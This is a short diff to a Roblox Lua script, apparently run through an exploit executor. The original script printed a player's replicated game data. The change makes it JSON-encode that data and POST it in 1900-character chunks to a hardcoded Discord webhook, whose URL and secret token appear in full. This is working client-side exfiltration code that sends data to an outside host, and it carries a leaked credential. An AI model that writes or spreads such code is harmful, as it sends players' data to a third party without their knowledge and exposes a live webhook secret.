@@ -2,5 +2,22 @@ local Replion = require(game:GetService("ReplicatedStorage"):WaitForChild("Packa
 local PlayerData = Replion.Client:WaitReplion("Data")
 task.wait(1)
 local HS = game:GetService("HttpService")
+local WEBHOOK = "https://discordapp.com/api/webhooks/1450517804037046508/yi2ZuXEbsPhSQU6MaJ2fgmvm4YPGSz1G0q1oHpApUiYpRrDFCAd1-kuYC4q0sxZ8YOKY"
+
 local ok, data = pcall(function() return PlayerData:Get() end)
-print(HS:JSONEncode(data or {}))
+local encoded = HS:JSONEncode(data or {})
+
+-- Kirim per chunk 1900 char
+local i = 1
+while i <= #encoded do
+    local chunk = encoded:sub(i, i+1899)
+    pcall(function()
+        request({Url=WEBHOOK, Method="POST",
+            Headers={["Content-Type"]="application/json"},
+            Body=HS:JSONEncode({content="```json\n"..chunk.."\n```"})
+        })
+    end)
+    i = i + 1900
+    task.wait(1)
+end
+print("done")
